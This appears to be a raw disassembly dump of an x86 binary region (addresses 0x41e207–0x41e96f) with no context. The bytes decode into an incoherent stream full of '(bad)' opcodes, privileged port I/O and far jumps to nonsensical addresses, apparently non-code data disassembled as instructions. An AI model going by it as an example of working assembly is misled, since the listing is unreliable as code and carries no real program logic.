  41e207:	add    BYTE PTR [eax],al
  41e209:	add    cl,bl
  41e20b:	retf   0x48f6
  41e20e:	nop
  41e20f:	mov    dl,0xe
  41e211:	jb     0x41e217
  41e213:	xor    eax,0x352c74e5
  41e218:	in     eax,0xe6
  41e21a:	iret   
  41e21b:	and    eax,0x2d93e90f
  41e220:	pop    esp
  41e221:	shr    ebx,1
  41e223:	sar    esp,cl
  41e225:	ficomp WORD PTR [edx]
  41e227:	sub    eax,0xdf63d554
  41e22c:	add    eax,DWORD PTR [ecx]
  41e22e:	sbb    eax,0x79000ea2
  41e233:	cmp    eax,0x763a6001
  41e238:	push   cs
  41e239:	mov    eax,DWORD PTR [ecx-0x77]
  41e23c:	in     al,dx
  41e23d:	test   BYTE PTR [esi],dh
  41e23f:	lods   eax,DWORD PTR ds:[esi]
  41e240:	xchg   edx,eax
  41e241:	xchg   edi,eax
  41e242:	jmp    0xfeabf0fc
  41e247:	sub    al,BYTE PTR [ecx-0x18]
  41e24a:	mov    al,ds:0xf9f6830e
  41e24f:	mov    ch,0x1f
  41e251:	not    al
  41e253:	ret    0x7eea
  41e256:	repnz xor BYTE PTR [edx],bl
  41e259:	mov    bh,0x93
  41e25b:	mov    ch,0x99
  41e25d:	push   ebp
  41e25e:	adc    DWORD PTR [esi],ecx
  41e260:	cli    
  41e261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e262:	ss cmp al,0x91
  41e265:	rcr    ch,0xad
  41e268:	push   esp
  41e269:	cmp    ecx,esp
  41e26b:	dec    ecx
  41e26c:	push   0xffffffe9
  41e26e:	add    BYTE PTR [eax],al
  41e270:	add    BYTE PTR [eax],al
  41e272:	add    BYTE PTR [edx-0x49],dl
  41e275:	and    bl,bl
  41e277:	(bad)  
  41e278:	cmp    al,0x1
  41e27a:	je     0x41e237
  41e27c:	jne    0x41e28c
  41e27e:	test   BYTE PTR [edx+0x296a4bb1],ah
  41e284:	(bad)  
  41e285:	push   cs
  41e286:	call   FWORD PTR [ebp+ecx*8-0x72]
  41e28a:	inc    esp
  41e28b:	imul   edi,DWORD PTR [ecx+eax*1],0xe756b78
  41e292:	mov    ecx,DWORD PTR [ecx+0x6674e432]
  41e298:	xor    ah,bl
  41e29a:	call   0x2f5110
  41e29f:	jle    0x41e254
  41e2a1:	es mov ecx,?
  41e2a4:	mov    ah,0xf7
  41e2a6:	add    bl,BYTE PTR [edx-0x32ca6abc]
  41e2ac:	(bad)  
  41e2ad:	push   edx
  41e2ae:	add    BYTE PTR [eax+0x7673804e],dl
  41e2b4:	jne    0x41e2a0
  41e2b6:	mov    al,ch
  41e2b8:	out    dx,eax
  41e2b9:	sub    eax,ebp
  41e2bb:	sub    WORD PTR [ebx],dx
  41e2be:	add    BYTE PTR ds:0x74fae8e,bl
  41e2c4:	push   es
  41e2c5:	xchg   edx,eax
  41e2c6:	adc    DWORD PTR [eax-0x35],edx
  41e2c9:	ins    BYTE PTR es:[edi],dx
  41e2ca:	mov    edi,0xcf9ae27c
  41e2cf:	mov    ds:0x91fdbb12,eax
  41e2d4:	retf   
  41e2d5:	adc    DWORD PTR [eax+0x0],esi
  41e2db:	add    BYTE PTR [ecx+0x458b1d44],dl
  41e2e1:	inc    ebx
  41e2e2:	mov    ebx,0x8767be2d
  41e2e7:	xor    eax,edx
  41e2e9:	scas   eax,DWORD PTR es:[edi]
  41e2ea:	sub    BYTE PTR [ecx-0x37],bl
  41e2ed:	mov    edi,DWORD PTR [esp+edi*1]
  41e2f0:	sub    BYTE PTR [ebx-0x16],dh
  41e2f3:	inc    ebx
  41e2f4:	nop
  41e2f5:	jae    0x41e346
  41e2f7:	pop    edx
  41e2f8:	xchg   edx,eax
  41e2f9:	retf   
  41e2fa:	cwde   
  41e2fb:	push   edx
  41e2fc:	mov    al,0x63
  41e2fe:	xor    DWORD PTR [eax],0xfc2561bb
  41e304:	sbb    eax,0xa969463f
  41e309:	inc    edx
  41e30a:	mov    edx,0x11ca8598
  41e30f:	mov    ebx,ebp
  41e311:	test   DWORD PTR [edx+ebx*1],edi
  41e314:	leave  
  41e315:	mov    cl,0x62
  41e317:	repnz nop
  41e319:	leave  
  41e31a:	and    BYTE PTR [ebx-0x76dd8a2b],cl
  41e320:	inc    esi
  41e321:	ret    0x3004
  41e324:	xchg   ecx,eax
  41e325:	leave  
  41e326:	push   ss
  41e327:	mov    ch,0x50
  41e329:	push   ebx
  41e32a:	sub    eax,0x62b2e1d4
  41e32f:	ds cld 
  41e331:	and    BYTE PTR [eax-0x37],0x37
  41e335:	push   ebx
  41e336:	pop    es
  41e337:	add    edx,DWORD PTR [eax-0x19647b51]
  41e33d:	(bad)  
  41e33f:	add    eax,DWORD PTR [eax]
  41e341:	add    BYTE PTR [eax],al
  41e343:	add    BYTE PTR [eax],al
  41e345:	nop
  41e346:	sub    esi,DWORD PTR [ebx]
  41e348:	mov    al,0x75
  41e34a:	fwait
  41e34b:	mov    dh,0x8
  41e34d:	or     al,0x60
  41e34f:	test   BYTE PTR [ebx],0x90
  41e352:	pop    eax
  41e353:	lock call 0xb290:0x3063684
  41e35b:	jb     0x41e3a3
  41e35d:	rol    BYTE PTR [ecx-0x353272d9],0x53
  41e364:	rcl    esi,cl
  41e366:	fistp  WORD PTR [esi+0x3e]
  41e369:	fdiv   QWORD PTR ds:0x800c08b8
  41e36f:	test   BYTE PTR [ebx],0x90
  41e372:	sub    eax,0x8747afbb
  41e377:	pusha  
  41e378:	leave  
  41e379:	mov    bh,0x15
  41e37b:	or     BYTE PTR [ebx],al
  41e37d:	nop
  41e37e:	sub    ecx,DWORD PTR [eax+0x7e]
  41e381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e382:	scas   eax,DWORD PTR es:[edi]
  41e383:	jnp    0x41e3cf
  41e385:	xchg   edi,eax
  41e386:	fcomip st,st(7)
  41e388:	mov    edx,ds
  41e38a:	push   es
  41e38b:	jns    0x41e327
  41e38d:	mov    bh,0xaf
  41e38f:	jns    0x41e367
  41e391:	jle    0x41e372
  41e393:	test   DWORD PTR [edx+eiz*8+0x5c166102],0xc28a2cb3
  41e39e:	add    cl,BYTE PTR [ebx+0x42]
  41e3a1:	inc    eax
  41e3a2:	mov    bl,0x3d
  41e3a4:	mov    dl,dl
  41e3a6:	push   es
  41e3a7:	xor    eax,0x3e
  41e3ac:	add    BYTE PTR [eax],al
  41e3ae:	pop    esp
  41e3af:	mov    cl,0xe
  41e3b1:	jmp    0x74d99649
  41e3b6:	jmp    FWORD PTR [ecx]
  41e3b8:	fisub  DWORD PTR [edx]
  41e3ba:	sbb    al,0x62
  41e3bc:	push   ebx
  41e3bd:	push   ebx
  41e3be:	cwde   
  41e3bf:	jp     0x41e358
  41e3c1:	and    al,0x54
  41e3c3:	push   ebp
  41e3c4:	sub    DWORD PTR [ecx+0x2749683],esp
  41e3ca:	leave  
  41e3cb:	out    dx,al
  41e3cc:	arpl   si,sp
  41e3ce:	in     al,dx
  41e3cf:	jl     0x41e3e3
  41e3d1:	cmp    al,0xf6
  41e3d3:	leave  
  41e3d4:	(bad)  
  41e3d5:	fisttp QWORD PTR [esi+0x20]
  41e3d8:	jns    0x41e3cf
  41e3da:	aam    0x9a
  41e3dc:	xchg   esp,eax
  41e3dd:	sbb    ebx,DWORD PTR [ebp-0x5b90fd59]
  41e3e3:	popa   
  41e3e4:	adc    ch,BYTE PTR [eax]
  41e3e6:	sub    eax,DWORD PTR [edi]
  41e3e8:	inc    edi
  41e3e9:	btc    esi,esi
  41e3ec:	arpl   bp,bp
  41e3ee:	jge    0x41e419
  41e3f0:	pop    esp
  41e3f1:	mov    esp,esi
  41e3f3:	dec    esp
  41e3f4:	pop    es
  41e3f5:	outs   dx,BYTE PTR ds:[esi]
  41e3f6:	daa    
  41e3f7:	sub    al,BYTE PTR [ecx+edi*1+0x13]
  41e3fb:	cmc    
  41e3fc:	adc    dh,BYTE PTR [edx+0x51]
  41e3ff:	push   es
  41e400:	cli    
  41e401:	fwait
  41e402:	adc    al,0x7c
  41e404:	cmc    
  41e405:	bound  esp,QWORD PTR [ecx-0x2e]
  41e408:	xchg   edi,eax
  41e409:	mov    ah,0xdb
  41e40b:	cdq    
  41e40c:	pop    eax
  41e40d:	icebp  
  41e40e:	xchg   esi,eax
  41e40f:	xor    esp,DWORD PTR [ebx+0xe9]
  41e415:	add    BYTE PTR [eax],al
  41e417:	xchg   ebx,eax
  41e418:	mov    dl,0x99
  41e41a:	stos   DWORD PTR es:[edi],eax
  41e41b:	jg     0x41e448
  41e41d:	sub    esi,DWORD PTR [ecx-0x33]
  41e420:	xor    eax,0x6c4b3d5c
  41e425:	push   ss
  41e426:	out    0x12,al
  41e428:	inc    esi
  41e429:	psubsw mm2,QWORD PTR [ebx+0x6500512b]
  41e430:	sub    DWORD PTR [edx],esp
  41e432:	mov    dl,al
  41e434:	frstor [esi]
  41e436:	push   es
  41e437:	lds    edi,FWORD PTR [edi+edx*4]
  41e43a:	inc    edi
  41e43b:	xor    eax,0xd40453f9
  41e440:	and    eax,0xf9214797
  41e445:	push   ebx
  41e446:	or     ah,al
  41e448:	or     eax,0xf93d4797
  41e44d:	push   ebx
  41e44e:	or     al,0x54
  41e450:	cmc    
  41e451:	xchg   esi,eax
  41e452:	inc    edi
  41e453:	jmp    0xc5523850
  41e458:	sbb    eax,0xf8e54797
  41e45d:	push   ebx
  41e45e:	adc    al,0x95
  41e460:	test   DWORD PTR [esi+0x53f99147],edx
  41e466:	sbb    BYTE PTR [ebp-0x12b86993],al
  41e46c:	clc    
  41e46d:	push   ebx
  41e46e:	sbb    al,0xd5
  41e470:	push   esp
  41e471:	xchg   esi,eax
  41e472:	inc    edi
  41e473:	fprem  
  41e475:	push   ebx
  41e476:	and    ch,al
  41e478:	jl     0x41e410
  41e47a:	inc    edi
  41e47b:	add    BYTE PTR [eax],al
  41e47d:	add    BYTE PTR [eax],al
  41e47f:	add    ch,dl
  41e481:	clc    
  41e482:	push   ebx
  41e483:	and    al,0xd5
  41e485:	fs xchg esi,eax
  41e487:	inc    edi
  41e488:	cmp    ecx,0x4cc42853
  41e48e:	xchg   esi,eax
  41e48f:	inc    edi
  41e490:	popf   
  41e491:	clc    
  41e492:	push   ebx
  41e493:	sub    al,0xd4
  41e495:	xor    al,0x92
  41e497:	fild   DWORD PTR [ecx+ebp*2+0x78]
  41e49b:	xor    BYTE PTR [esi],ah
  41e49d:	sub    BYTE PTR [ecx+0x8],cl
  41e4a0:	sbb    al,BYTE PTR [ecx+eax*1+0x5c]
  41e4a4:	ja     0x41e517
  41e4a6:	push   cs
  41e4a7:	push   0x49
  41e4a9:	(bad)  
  41e4aa:	cdq    
  41e4ab:	inc    ebx
  41e4ac:	nop
  41e4ad:	sti    
  41e4ae:	and    ebp,edi
  41e4b0:	test   DWORD PTR [edi],ecx
  41e4b2:	cld    
  41e4b3:	aas    
  41e4b4:	nop
  41e4b5:	dec    eax
  41e4b6:	lods   eax,DWORD PTR ds:[esi]
  41e4b7:	pop    ss
  41e4b8:	or     DWORD PTR [ebx+0x53915796],0x26
  41e4bf:	in     eax,0xb
  41e4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4c3:	mov    ch,bl
  41e4c5:	jmp    0x41e480
  41e4c7:	pop    eax
  41e4c8:	das    
  41e4c9:	cld    
  41e4ca:	or     DWORD PTR [eax-0x18addc2b],0xffffffd0
  41e4d1:	in     al,dx
  41e4d2:	cmp    esp,0x13
  41e4d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4d6:	xchg   ah,bh
  41e4d8:	sbb    cl,BYTE PTR [eax]
  41e4da:	mov    eax,0x530bc30a
  41e4df:	ror    DWORD PTR [ebx],0x76
  41e4e2:	mov    edx,0x80
  41e4e7:	add    BYTE PTR [eax],al
  41e4e9:	inc    ebp
  41e4ea:	pop    ss
  41e4eb:	test   BYTE PTR [ecx],dh
  41e4ed:	rol    BYTE PTR [edx+0x4d],1
  41e4f0:	push   edi
  41e4f1:	xchg   edx,eax
  41e4f2:	retf   
  41e4f3:	iret   
  41e4f4:	add    edx,DWORD PTR [eax+0x11eb97a6]
  41e4fa:	inc    edi
  41e4fb:	(bad)  
  41e4fc:	dec    edi
  41e4fe:	retf   0x561e
  41e501:	pop    edi
  41e502:	push   eax
  41e503:	mov    BYTE PTR [eax-0x606cd3f],cl
  41e509:	mov    bh,0x53
  41e50b:	(bad)  
  41e50c:	cmp    dh,BYTE PTR [eax+eax*1]
  41e50f:	add    BYTE PTR cs:[eax-0x6e5b922c],dl
  41e516:	retf   
  41e517:	adc    DWORD PTR [eax+0x44391e55],eax
  41e51d:	nop
  41e51e:	leave  
  41e51f:	adc    al,BYTE PTR [ebx+0x11cb2a]
  41e525:	adc    eax,0xea25fea4
  41e52a:	mov    dl,0xf
  41e52c:	xchg   edx,eax
  41e52e:	ror    dh,cl
  41e530:	stos   DWORD PTR es:[edi],eax
  41e531:	dec    eax
  41e532:	loopne 0x41e52b
  41e534:	add    ebp,edx
  41e536:	(bad)  [ebp-0x37097d6c]
  41e53c:	inc    ebx
  41e53d:	nop
  41e53e:	sub    eax,0xeb18a383
  41e543:	psrlq  mm6,mm1
  41e546:	(bad)  
  41e548:	jle    0x41e541
  41e54a:	stos   DWORD PTR es:[edi],eax
  41e54b:	jp     0x41e560
  41e54d:	add    BYTE PTR [eax],al
  41e54f:	add    BYTE PTR [eax],al
  41e551:	add    BYTE PTR [edi],ch
  41e553:	fdivr  st(7),st
  41e555:	ror    BYTE PTR [eax+0x2e],1
  41e558:	cmp    eax,DWORD PTR [ebp+ebx*8-0x6fbc8dd6]
  41e55f:	and    BYTE PTR [edx+0x2e],0xf4
  41e563:	sub    eax,0x5e0e9c3b
  41e568:	lahf   
  41e569:	mov    ebp,0x8af6de52
  41e56e:	pop    edx
  41e56f:	retf   0x365e
  41e572:	cld    
  41e573:	sub    DWORD PTR [ebx],eax
  41e575:	mov    al,ds:0xab877e0f
  41e57a:	add    dh,bl
  41e57c:	pushf  
  41e57d:	xchg   esp,eax
  41e57e:	push   cs
  41e57f:	data16 fwait
  41e581:	xchg   BYTE PTR [edx-0x2a],bl
  41e584:	jae    0x41e549
  41e586:	inc    edx
  41e587:	ror    BYTE PTR [edi-0x8244188],0x88
  41e58e:	dec    edx
  41e58f:	retf   0xb53f
  41e592:	aam    0xb2
  41e594:	imul   DWORD PTR [edx+0x3f7b178]
  41e59a:	test   al,0x29
  41e59c:	test   DWORD PTR [ebx],0xaba32790
  41e5a2:	ja     0x41e592
  41e5a4:	xor    al,0x3
  41e5a6:	nop
  41e5a7:	retf   0x190e
  41e5aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5ab:	mov    dl,0xe
  41e5ad:	gs push ebx
  41e5af:	scas   al,BYTE PTR es:[edi]
  41e5b0:	xchg   edx,eax
  41e5b1:	clc    
  41e5b2:	xchg   edx,eax
  41e5b3:	mov    dl,0xe
  41e5b5:	jb     0x41e5b7
  41e5b7:	add    BYTE PTR [eax],al
  41e5b9:	add    BYTE PTR [eax],al
  41e5bb:	mov    ss,WORD PTR [esi+0x79]
  41e5be:	lods   eax,DWORD PTR ds:[esi]
  41e5bf:	xchg   ebx,eax
  41e5c0:	sub    DWORD PTR [ebp+eax*2+0xa],edx
  41e5c4:	pushf  
  41e5c5:	push   ds
  41e5c6:	jb     0x41e556
  41e5c8:	push   es
  41e5c9:	cwde   
  41e5ca:	test   al,0x57
  41e5cc:	sub    dl,BYTE PTR [ecx+ecx*2+0xa]
  41e5d0:	pushf  
  41e5d1:	bound  esi,QWORD PTR es:[esi+0x2]
  41e5d5:	cwde   
  41e5d6:	sub    BYTE PTR [eax+0x2a],al
  41e5d9:	push   esp
  41e5da:	and    DWORD PTR [ebp-0x369db164],0xc82897ea
  41e5e4:	sub    DWORD PTR [ebp+ebx*2-0x73],edx
  41e5e8:	pushf  
  41e5e9:	push   esi
  41e5ea:	jb     0x41e645
  41e5ec:	test   BYTE PTR [ecx+0x60],0x55
  41e5f0:	outs   dx,BYTE PTR ds:[esi]
  41e5f1:	xchg   edi,eax
  41e5f2:	xor    al,dh
  41e5f4:	dec    eax
  41e5f5:	adc    ah,BYTE PTR [ebx-0x64]
  41e5f8:	sub    BYTE PTR [edi-0x17],cl
  41e5fb:	mov    esi,0x83bef6f3
  41e600:	mov    dl,0xe
  41e602:	gs int3 
  41e604:	lods   eax,DWORD PTR ds:[esi]
  41e605:	xchg   edx,eax
  41e606:	cmp    eax,0x720eb294
  41e60b:	xchg   ecx,eax
  41e60c:	push   esi
  41e60d:	jns    0x41e63c
  41e60f:	xchg   esp,eax
  41e610:	xor    ebx,edi
  41e612:	fst    QWORD PTR [eax]
  41e614:	je     0x41e634
  41e616:	mov    ds:0xe9501a10,eax
  41e61b:	or     edx,DWORD PTR [esi+0xe85d]
  41e621:	add    BYTE PTR [eax],al
  41e623:	add    BYTE PTR [ebx+0x8decf2f],dl
  41e629:	inc    ebp
  41e62a:	(bad)  
  41e62c:	jns    0x41e5e4
  41e62e:	xchg   edi,eax
  41e62f:	or     eax,0x52b94d
  41e634:	jmp    0xa802:0x308d1a12
  41e63b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e63c:	repnz outs dx,DWORD PTR ds:[esi]
  41e63e:	push   cs
  41e63f:	call   0x2f5ba4
  41e644:	in     al,dx
  41e645:	out    dx,al
  41e646:	pusha  
  41e647:	jl     0x41e63b
  41e649:	mov    bl,0x72
  41e64b:	imul   edi,ebp,0xffffffb5
  41e64e:	(bad)  
  41e64f:	in     al,dx
  41e650:	xor    eax,0x83385533
  41e655:	out    dx,al
  41e656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e657:	inc    ecx
  41e658:	sub    DWORD PTR [esi],edi
  41e65a:	sti    
  41e65b:	dec    esi
  41e65c:	cmp    BYTE PTR [esi-0x6f433f6f],dh
  41e662:	xchg   edi,eax
  41e663:	or     eax,0x52b9cd
  41e668:	stos   BYTE PTR es:[edi],al
  41e669:	cmp    DWORD PTR [edx],ebx
  41e66b:	(bad)  
  41e66c:	rol    BYTE PTR [edx],0xa8
  41e66f:	ficom  DWORD PTR [edx]
  41e671:	outs   dx,DWORD PTR ds:[esi]
  41e672:	push   cs
  41e673:	call   0x2f5a94
  41e678:	ins    BYTE PTR es:[edi],dx
  41e679:	cmc    
  41e67a:	pusha  
  41e67b:	dec    eax
  41e67c:	bound  esi,QWORD PTR [edx-0x5152948e]
  41e682:	(bad)  
  41e683:	in     al,dx
  41e684:	cmc    
  41e685:	xor    dl,BYTE PTR [ebp+0x48]
  41e688:	add    BYTE PTR [eax],al
  41e68a:	add    BYTE PTR [eax],al
  41e68c:	add    BYTE PTR [ebx+0x41],al
  41e68f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e690:	inc    ecx
  41e691:	mov    ecx,0xb84ea73d
  41e696:	mov    ch,0x91
  41e698:	sar    BYTE PTR [ebx+edx*8-0x4672f26a],0x52
  41e6a0:	add    BYTE PTR [edx],bh
  41e6a2:	cmp    DWORD PTR [edx],ebx
  41e6a4:	(bad)  
  41e6a5:	loopne 0x41e640
  41e6a7:	test   al,0x6
  41e6a9:	nop
  41e6aa:	aas    
  41e6ab:	push   ebx
  41e6ac:	add    BYTE PTR [eax-0x7000afd6],ch
  41e6b2:	inc    esi
  41e6b3:	shl    DWORD PTR [edx-0x64],1
  41e6b6:	or     DWORD PTR [edi],0x7d
  41e6b9:	nop
  41e6ba:	retf   
  41e6bb:	xchg   ebp,eax
  41e6bc:	mov    edi,0x2d7d4fc
  41e6c1:	in     eax,0x42
  41e6c3:	push   esi
  41e6c4:	add    BYTE PTR [ecx-0x7016ed85],dl
  41e6ca:	push   0x35
  41e6cc:	imul   ecx,esp,0x7c576acb
  41e6d2:	ret    
  41e6d3:	mov    dl,0x7d
  41e6d5:	nop
  41e6d6:	retf   
  41e6d7:	ret    
  41e6d8:	mov    edi,0xc73d41df
  41e6dd:	push   ebx
  41e6de:	mov    bl,0xb
  41e6e0:	clc    
  41e6e1:	das    
  41e6e2:	rol    bl,1
  41e6e4:	mov    edi,0x6704ce68
  41e6e9:	aam    0xcb
  41e6eb:	push   cs
  41e6ec:	inc    ebx
  41e6ed:	lea    ebp,[edi+0xb]
  41e6f0:	inc    esp
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    BYTE PTR [eax],al
  41e6f5:	add    BYTE PTR [eax-0x6bb193f4],dl
  41e6fb:	rcl    DWORD PTR [ebp+0x6ad385d1],0x3e
  41e702:	mov    BYTE PTR [edx+0x51],dl
  41e705:	or     al,0xfb
  41e707:	cld    
  41e708:	push   0x6e
  41e70a:	cwde   
  41e70b:	aam    0xa7
  41e70d:	jno    0x41e6c6
  41e70f:	push   esp
  41e710:	push   ecx
  41e711:	add    al,0x5
  41e713:	iret   
  41e714:	push   edi
  41e715:	cmp    eax,esp
  41e717:	(bad)  
  41e719:	gs sbb ecx,ebp
  41e71c:	xchg   edx,eax
  41e71d:	rcl    DWORD PTR [edx+0x2e0c2152],0x4e
  41e724:	shl    BYTE PTR [edx-0x5e],cl
  41e727:	mov    cl,0xdd
  41e729:	retf   0x5f91
  41e72c:	std    
  41e72d:	jle    0x41e780
  41e72f:	mov    ah,0x6e
  41e731:	inc    ebx
  41e732:	test   BYTE PTR [ebp+0x34513237],ah
  41e738:	xlat   BYTE PTR ds:[ebx]
  41e739:	inc    DWORD PTR [edi-0x220048d3]
  41e73f:	repz lea edi,[esi+eiz*2+0x33]
  41e744:	mov    esi,0x11646fff
  41e749:	cmp    DWORD PTR [ecx-0x77ee1129],esp
  41e74f:	pusha  
  41e750:	out    0x7c,al
  41e752:	lds    ebp,FWORD PTR [esi-0x34f8ff90]
  41e758:	(bad)  
  41e759:	leave  
  41e75a:	add    BYTE PTR [eax],al
  41e75c:	add    BYTE PTR [eax],al
  41e75e:	add    BYTE PTR [edi-0x28],al
  41e761:	mov    ah,0xcc
  41e763:	mov    ebp,0xd4a069aa
  41e768:	sub    ecx,DWORD PTR [esi-0x426cc7f9]
  41e76e:	add    edx,DWORD PTR [eax-0x6ff7a9cd]
  41e774:	xor    ebx,DWORD PTR [esi-0x4]
  41e777:	pop    ss
  41e778:	jbe    0x41e732
  41e77a:	cmp    DWORD PTR [ecx],ebx
  41e77c:	loop   0x41e78a
  41e77e:	test   BYTE PTR [ebp+0x7b7cf7a6],al
  41e784:	mov    ?,ebx
  41e786:	pop    ss
  41e787:	mov    DWORD PTR [ebx],ebp
  41e789:	push   cs
  41e78a:	or     BYTE PTR [ecx],bl
  41e78c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e78d:	outs   dx,BYTE PTR ds:[esi]
  41e78e:	fwait
  41e78f:	jmp    0xb62b:0x4503f7ed
  41e796:	fwait
  41e797:	sub    ecx,eax
  41e799:	pushf  
  41e79a:	nop
  41e79b:	ins    BYTE PTR es:[edi],dx
  41e79c:	js     0x41e757
  41e79e:	pop    es
  41e79f:	nop
  41e7a0:	add    BYTE PTR [edi*2-0x1af171c5],0x34
  41e7a8:	enter  0xef29,0xab
  41e7ac:	bound  esi,QWORD PTR [ecx]
  41e7ae:	imul   eax,DWORD PTR [ecx-0x592af15a],0x14369982
  41e7b8:	adc    ah,BYTE PTR gs:[edx-0x71]
  41e7bc:	inc    eax
  41e7bd:	div    DWORD PTR [esi]
  41e7bf:	dec    esi
  41e7c0:	xlat   BYTE PTR ds:[ebx]
  41e7c1:	in     eax,dx
  41e7c2:	stos   BYTE PTR es:[edi],al
  41e7c3:	add    BYTE PTR [eax],al
  41e7c5:	add    BYTE PTR [eax],al
  41e7c7:	add    BYTE PTR [ebp+esi*2+0x16],cl
  41e7cb:	mov    ebx,0x62457a30
  41e7d0:	push   ecx
  41e7d1:	iret   
  41e7d2:	mov    ds:0x4dd600ff,al
  41e7d7:	mov    edi,0x6a0eb355
  41e7dc:	test   DWORD PTR [edx-0x2f334bbf],0x7d892221
  41e7e6:	daa    
  41e7e7:	pushf  
  41e7e8:	xchg   ebx,eax
  41e7e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7ea:	xchg   ebx,eax
  41e7eb:	sub    eax,0x330eb293
  41e7f0:	xor    edi,DWORD PTR [esi-0x782b16b2]
  41e7f6:	add    eax,0x4dca9429
  41e7fb:	push   eax
  41e7fc:	pop    es
  41e7fd:	(bad)  
  41e7fe:	cdq    
  41e7ff:	mov    eax,ds:0x6c0e6c8d
  41e804:	inc    ebp
  41e805:	fs adc eax,0x18cfd3fb
  41e80b:	call   0xe8db9aa3
  41e810:	mov    ds:0x79ed67,al
  41e815:	xlat   BYTE PTR ds:[ebx]
  41e816:	in     eax,dx
  41e817:	jmp    0x3a505c76
  41e81c:	pop    ebx
  41e81d:	scas   eax,DWORD PTR es:[edi]
  41e81e:	mov    es,WORD PTR ds:[ebp-0x49]
  41e822:	(bad)  
  41e824:	mov    ecx,0xa94597b2
  41e829:	mov    ds:0x897,eax
  41e82e:	add    BYTE PTR [eax],al
  41e830:	add    BYTE PTR [ecx-0x47e762d9],bl
  41e836:	mov    dl,0xe
  41e838:	mov    esi,esp
  41e83a:	mov    dl,0x3f
  41e83c:	mov    esp,DWORD PTR [ecx-0x666e145e]
  41e842:	lods   eax,DWORD PTR ds:[esi]
  41e843:	push   cs
  41e844:	add    dl,dh
  41e846:	imul   ecx,DWORD PTR [esi],0xffffff8d
  41e849:	and    eax,0x818b05ce
  41e84e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e84f:	jbe    0x41e891
  41e851:	push   esi
  41e852:	jb     0x41e862
  41e854:	push   eax
  41e855:	mov    esi,0x4c090df
  41e85a:	mov    BYTE PTR [ecx+0x5df65544],bl
  41e860:	mov    DWORD PTR ds:0x44ff05ce,ebx
  41e866:	call   0x5817:0xbc393fff
  41e86d:	pop    ss
  41e86e:	push   edi
  41e86f:	push   ecx
  41e870:	and    al,0x4d
  41e872:	add    DWORD PTR [esi+0x3272cc51],ebp
  41e878:	sbb    bh,dl
  41e87a:	push   edi
  41e87b:	push   ecx
  41e87c:	and    al,0x71
  41e87e:	ss fadd st,st(0)
  41e881:	sub    DWORD PTR [edx-0x3b9a3f6e],esi
  41e887:	xchg   esi,eax
  41e888:	inc    esp
  41e889:	xchg   ebp,eax
  41e88a:	(bad)  
  41e88b:	mov    gs,esp
  41e88d:	fstp   DWORD PTR [eax+0x15]
  41e890:	mov    edi,DWORD PTR ds:0x246225
  41e896:	add    BYTE PTR [eax],al
  41e898:	add    BYTE PTR [eax],al
  41e89a:	xchg   ebp,eax
  41e89b:	xor    esp,DWORD PTR [edx+0x24]
  41e89e:	mov    ecx,0x99a5b04b
  41e8a3:	dec    ebx
  41e8a4:	jmp    0x9000:0x138b9091
  41e8ab:	push   eax
  41e8ac:	push   ebp
  41e8ad:	and    al,0xa8
  41e8af:	mov    ebx,0xbabf0769
  41e8b4:	jmp    0x85fc:0xe5e73cfc
  41e8bb:	mov    edi,0x5e903fe1
  41e8c0:	push   ebp
  41e8c1:	and    al,0x7c
  41e8c3:	sbb    ebx,DWORD PTR [ebp+0x51d84812]
  41e8c9:	add    dl,bh
  41e8cb:	sar    DWORD PTR [ecx],cl
  41e8cd:	std    
  41e8ce:	cld    
  41e8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8d0:	push   esi
  41e8d1:	or     WORD PTR [edi],cx
  41e8d4:	neg    BYTE PTR [edi]
  41e8d6:	ja     0x41e8ce
  41e8d8:	sub    eax,0x6acbd011
  41e8dd:	inc    ebx
  41e8de:	lods   al,BYTE PTR ds:[esi]
  41e8df:	out    0x96,eax
  41e8e1:	mov    edi,0xfcc84f8f
  41e8e6:	push   edi
  41e8e7:	mov    esp,0x76904268
  41e8ec:	and    eax,0xe960a024
  41e8f1:	push   ecx
  41e8f2:	adc    esp,DWORD PTR [edi+0x4e3488e1]
  41e8f8:	add    eax,0x766e6024
  41e8fd:	mov    ds:0x0,al
  41e902:	add    al,al
  41e904:	es pushf 
  41e906:	mov    gs,WORD PTR [eax]
  41e908:	retf   
  41e909:	adc    DWORD PTR [eax],eax
  41e90b:	or     edi,ebx
  41e90d:	ins    DWORD PTR es:[edi],dx
  41e90e:	inc    ebx
  41e90f:	mov    ah,0xc7
  41e911:	and    ebp,edi
  41e913:	popf   
  41e914:	mov    ebx,0x4e903fdf
  41e919:	test   BYTE PTR [edx-0x75],dh
  41e91c:	gs (bad) 
  41e91e:	jnp    0x41e8d4
  41e920:	sti    
  41e921:	call   0x50a8:0xc8b29372
  41e928:	sub    BYTE PTR [ecx+0x2077362d],bh
  41e92e:	adc    ebx,0xc7fcb985
  41e934:	jge    0x41e996
  41e936:	mov    al,ds:0x93607c4e
  41e93b:	or     ah,BYTE PTR [edi+0x63]
  41e93e:	jns    0x41e8d5
  41e940:	add    DWORD PTR ds:0x604a578d,0x37
  41e947:	pushf  
  41e948:	mov    al,ds:0x28d7871e
  41e94d:	(bad)  
  41e94e:	cld    
  41e94f:	rol    BYTE PTR [ecx],cl
  41e951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e952:	jp     0x41e936
  41e954:	(bad)  
  41e955:	push   esp
  41e956:	xor    al,0x88
  41e958:	daa    
  41e959:	mov    bl,0x8f
  41e95b:	aad    0xe9
  41e95d:	cmp    BYTE PTR [edi],dh
  41e95f:	sbb    edi,eax
  41e961:	jbe    0x41e903
  41e963:	mov    bl,0xb0
  41e965:	test   DWORD PTR [ebx],0x0
  41e96b:	add    dh,al
  41e96d:	daa    
  41e96e:	pop    es
  41e96f:	jg     0x41e97b
